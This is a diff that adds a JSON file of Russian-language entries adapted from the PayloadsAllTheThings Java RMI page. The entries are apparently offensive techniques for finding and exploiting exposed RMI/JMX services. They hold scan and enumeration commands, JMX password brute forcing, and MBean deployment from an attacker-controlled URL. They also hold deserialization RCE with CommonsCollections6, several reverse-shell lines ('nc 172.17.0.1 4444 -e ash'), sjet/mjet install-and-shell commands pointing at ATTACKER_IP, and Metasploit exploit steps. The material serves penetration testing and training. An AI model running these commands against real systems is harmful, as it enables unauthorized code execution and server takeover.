@@ -1,0 +1,125 @@
+{
+  "category": "Java RMI",
+  "source": "PayloadsAllTheThings/Java RMI/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое Java RMI и где искать",
+      "language": "text",
+      "tags": ["methodology", "rmi", "recon"],
+      "body": "Java RMI (Remote Method Invocation) — Java API, позволяющий объекту в одной JVM вызывать методы объекта в другой JVM, в том числе на удалённой машине. Это механизм распределённых вычислений в Java.\n• Если RMI-сервис сконфигурирован небрежно, он уязвим к различным методам удалённого выполнения кода (RCE).\n• Частый сценарий: разместить MLet-файл и заставить JMX-сервис загрузить MBeans с удалённого сервера (тулзы mjet/sjet).\n• Ищи открытые RMI-порты: RMI registry, DGC, Activator; JMX поверх RMI (jmxrmi).\n• Стандартные порты варьируются (1090, 1089, 9010 и т.п.) — сканируй весь диапазон, привязки в реестре нестандартные."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы для RMI/JMX",
+      "language": "text",
+      "tags": ["methodology", "tools"],
+      "body": "siberas/sjet — siberas JMX exploitation toolkit (https://github.com/siberas/sjet)\nmogwailabs/mjet — MOGWAI LABS JMX exploitation toolkit (https://github.com/mogwailabs/mjet)\nqtc-de/remote-method-guesser (rmg) — Java RMI Vulnerability Scanner (https://github.com/qtc-de/remote-method-guesser)\nqtc-de/beanshooter — JMX enumeration and attacking tool (https://github.com/qtc-de/beanshooter)"
+    },
+    {
+      "subcategory": "Детект",
+      "title": "Детект через nmap (rmi-dumpregistry / rmi-vuln-classloader)",
+      "language": "bash",
+      "tags": ["detection", "nmap", "rmi"],
+      "body": "$ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p TARGET_PORT TARGET_IP -Pn -v\n1089/tcp open  java-rmi Java RMI\n| rmi-vuln-classloader:\n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n| rmi-dumpregistry:\n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub"
+    },
+    {
+      "subcategory": "Детект",
+      "title": "Сканирование портов через remote-method-guesser (rmg scan)",
+      "language": "bash",
+      "tags": ["detection", "rmg", "portscan"],
+      "body": "$ rmg scan 172.17.0.2 --ports 0-65535\n[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.\n[+]  [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)\n[+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)\n[+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)\n[+]  [6234 / 6234] [#############################] 100%\n[+] Portscan finished."
+    },
+    {
+      "subcategory": "Энумерация реестра",
+      "title": "Энумерация реестра через remote-method-guesser (rmg enum)",
+      "language": "bash",
+      "tags": ["enumeration", "rmg", "registry"],
+      "body": "$ rmg enum 172.17.0.2 9010\n[+] RMI registry bound names:\n[+]\n[+]  - plain-server2\n[+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]\n[+]  - legacy-service\n[+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)\n[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]\n[+]  - plain-server\n[+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)\n[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]\n[...]"
+    },
+    {
+      "subcategory": "Детект",
+      "title": "Скан через Metasploit (java_rmi_server scanner)",
+      "language": "bash",
+      "tags": ["detection", "metasploit"],
+      "body": "use auxiliary/scanner/misc/java_rmi_server\nset RHOSTS <IPs>\nset RPORT <PORT>\nrun"
+    },
+    {
+      "subcategory": "RCE через beanshooter",
+      "title": "beanshooter — энумерация JMX и MBeans",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "enumeration"],
+      "body": "# Список доступных атрибутов\nbeanshooter info 172.17.0.2 9010\n\n# Показать значение атрибута\nbeanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose\n\n# Установить значение атрибута\nbeanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean\n\n# Список зарегистрированных MBeans\nbeanshooter list 172.17.0.2 9010\n\n# Энумерация JMX-эндпоинта\nbeanshooter enum 172.17.0.2 1090"
+    },
+    {
+      "subcategory": "RCE через beanshooter",
+      "title": "beanshooter — брутфорс пароля JMX",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "bruteforce"],
+      "body": "beanshooter brute 172.17.0.2 1090"
+    },
+    {
+      "subcategory": "RCE через beanshooter",
+      "title": "beanshooter — деплой MBean",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "deploy"],
+      "body": "beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000"
+    },
+    {
+      "subcategory": "Угадывание методов",
+      "title": "beanshooter — вызов метода на JMX-эндпоинте",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "invoke"],
+      "body": "beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'"
+    },
+    {
+      "subcategory": "RCE через beanshooter",
+      "title": "beanshooter — вызов произвольных public/static Java-методов",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "rce"],
+      "body": "beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File(\"/\")'\nbeanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'"
+    },
+    {
+      "subcategory": "RCE через beanshooter",
+      "title": "beanshooter — Standard MBean execution (reverse shell)",
+      "language": "bash",
+      "tags": ["beanshooter", "jmx", "rce", "reverse-shell"],
+      "body": "beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'"
+    },
+    {
+      "subcategory": "Атаки десериализации",
+      "title": "beanshooter — атака десериализации на JMX",
+      "language": "bash",
+      "tags": ["beanshooter", "deserialization", "rce"],
+      "body": "beanshooter serial 172.17.0.2 1090 CommonsCollections6 \"nc 172.17.0.1 4444 -e ash\" --username admin --password admin"
+    },
+    {
+      "subcategory": "RCE через sjet/mjet",
+      "title": "Требования для атаки sjet/mjet",
+      "language": "text",
+      "tags": ["sjet", "mjet", "requirements"],
+      "body": "• Jython\n• JMX-сервер может подключиться к HTTP-сервису, контролируемому атакующим\n• Аутентификация JMX не включена"
+    },
+    {
+      "subcategory": "RCE через sjet/mjet",
+      "title": "Как работает MLet-атака (шаги)",
+      "language": "text",
+      "tags": ["sjet", "mjet", "mlet", "methodology"],
+      "body": "1. Поднять веб-сервер, раздающий MLet-файл и JAR с вредоносными MBeans.\n2. Создать на целевом сервере через JMX экземпляр MBean javax.management.loading.MLet.\n3. Вызвать метод getMBeansFromURL этого MBean, передав URL веб-сервера. JMX-сервис подключится к HTTP-серверу и распарсит MLet-файл.\n4. JMX-сервис скачает и загрузит JAR, указанные в MLet-файле, сделав вредоносный MBean доступным через JMX.\n5. Атакующий вызывает методы вредоносного MBean."
+    },
+    {
+      "subcategory": "RCE через sjet/mjet",
+      "title": "Эксплуатация через sjet / mjet",
+      "language": "bash",
+      "tags": ["sjet", "mjet", "rce", "jython"],
+      "body": "jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000\njython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\"\njython sjet.py TARGET_IP TARGET_PORT super_secret shell\njython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password\njython sjet.py TARGET_IP TARGET_PORT super_secret uninstall\njython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\"\n\njython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000\njython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\"\njython mjet.py TARGET_IP TARGET_PORT command super_secret shell"
+    },
+    {
+      "subcategory": "RCE через Metasploit",
+      "title": "Metasploit — java_rmi_server exploit",
+      "language": "bash",
+      "tags": ["metasploit", "rce", "exploit"],
+      "body": "use exploit/multi/misc/java_rmi_server\nset RHOSTS <IPs>\nset RPORT <PORT>\n# configure also the payload if needed\nrun"
+    }
+  ]
+}
